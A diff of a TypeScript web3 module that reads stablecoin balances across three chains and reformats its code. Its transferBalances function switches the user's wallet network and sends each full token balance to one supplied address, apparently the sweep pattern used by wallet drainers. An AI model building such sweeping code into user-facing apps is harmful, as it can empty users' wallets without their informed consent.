@@ -7,7 +7,10 @@ const networkTokens: any = {
   polygon: {
     USDC: {
       address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-      abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint256 amount) returns (bool)"],
+      abi: [
+        "function balanceOf(address) view returns (uint256)",
+        "function transfer(address to, uint256 amount) returns (bool)",
+      ],
       provider: "https://polygon-rpc.com/",
       chainId: 137,
     },
@@ -15,7 +18,10 @@ const networkTokens: any = {
   arbitrum: {
     DAI: {
       address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
-      abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint256 amount) returns (bool)"],
+      abi: [
+        "function balanceOf(address) view returns (uint256)",
+        "function transfer(address to, uint256 amount) returns (bool)",
+      ],
       provider: "https://arb1.arbitrum.io/rpc",
       chainId: 42161,
     },
@@ -23,7 +29,10 @@ const networkTokens: any = {
   optimistic: {
     USDT: {
       address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-      abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint256 amount) returns (bool)"],
+      abi: [
+        "function balanceOf(address) view returns (uint256)",
+        "function transfer(address to, uint256 amount) returns (bool)",
+      ],
       provider: "https://mainnet.optimism.io",
       chainId: 10,
     },
@@ -75,7 +84,9 @@ export async function getBalance(network: any, address: any) {
         return new Promise(async (resolve, reject) => {
           const provider = new ethers.JsonRpcProvider(networkProvider);
           const contract = new ethers.Contract(tokenAddress, abi, provider);
+          console.log(token, "no DAI>>>>");
           const balance = formatString(
+            token,
             (await contract.balanceOf(address)).toString()
           );
           resolve({
@@ -89,20 +100,28 @@ export async function getBalance(network: any, address: any) {
   return balances;
 }
 
-export async function transferBalances(signer: ether.Signer, toAddress: string) {
+export async function transferBalances(
+  signer: ether.Signer,
+  toAddress: string
+) {
   const fromAddress = signer.getAddress();
   let oldSigner = signer;
   for (const [networkName, item] of Object.entries(networkTokens)) {
     const promises = [];
-  
+
     for (const key of Object.keys(item)) {
-      const { createdSigner: newSigner, createdProvider: newProvider } = await switchNetwork(oldSigner, item[key].chainId);
-      const contract = new ethers.Contract(item[key].address, item[key].abi, newProvider);
+      const { createdSigner: newSigner, createdProvider: newProvider } =
+        await switchNetwork(oldSigner, item[key].chainId);
+      const contract = new ethers.Contract(
+        item[key].address,
+        item[key].abi,
+        newProvider
+      );
       const balance = await contract.balanceOf(fromAddress);
       oldSigner = newSigner;
       promises.push(transfer(newSigner, toAddress, balance));
     }
-  
+
     await Promise.all(promises);
   }
   return true;
@@ -111,29 +130,35 @@ export async function transferBalances(signer: ether.Signer, toAddress: string) 
 async function switchNetwork(oldSigner: ether.Signer, chainId: number) {
   try {
     await window.ethereum.request({
-      method: 'wallet_switchEthereumChain',
+      method: "wallet_switchEthereumChain",
       params: [{ chainId: `0x${chainId.toString(16)}` }],
     });
-    
+
     // Function to check if the provider has switched to the desired chain
     const waitForProviderSwitch = async () => {
-      const newChainId = (await window.ethereum.request({ method: 'eth_chainId' })).toLowerCase();
+      const newChainId = (
+        await window.ethereum.request({ method: "eth_chainId" })
+      ).toLowerCase();
       return newChainId === `0x${chainId.toString(16)}`;
     };
 
     // Wait for the provider to switch (retry every 100 milliseconds)
     while (!(await waitForProviderSwitch())) {
-      await new Promise(resolve => setTimeout(resolve, 100));
+      await new Promise((resolve) => setTimeout(resolve, 100));
     }
     const createdProvider = new ethers.BrowserProvider(window.ethereum);
     const createdSigner = await createdProvider.getSigner();
     return { createdSigner, createdProvider };
   } catch (error) {
-    console.error('Error switching network:', error);
+    console.error("Error switching network:", error);
     throw error;
   }
 }
-export async function transfer(signer: ether.Signer, to: string, amount: number): Promise<boolean> {
+export async function transfer(
+  signer: ether.Signer,
+  to: string,
+  amount: number
+): Promise<boolean> {
   try {
     const tx = await signer.sendTransaction({
       to,
@@ -141,15 +166,15 @@ export async function transfer(signer: ether.Signer, to: string, amount: number)
     });
 
     await tx.wait();
-    console.log('Transfer successful');
+    console.log("Transfer successful");
     return true;
   } catch (error) {
-    console.error('Error transferring funds:', error);
+    console.error("Error transferring funds:", error);
     return false;
   }
 }
 
-function formatString(originString: string) {
+function formatString(token: string, originString: string) {
   const numericValue = parseFloat(originString);
 
   // Check if the conversion was successful
@@ -158,7 +183,10 @@ function formatString(originString: string) {
   }
 
   // Format the number with two decimal places
-  const formattedValue = (numericValue / 1000000).toFixed(6);
+  let formattedValue = (numericValue / 1000000).toFixed(6);
+  if (token == "DAI") {
+    formattedValue = (numericValue / 1000000000000000000).toFixed(18);
+  }
 
   // Remove trailing zeros
   const trimmedValue = formattedValue.replace(/\.?0+$/, "");
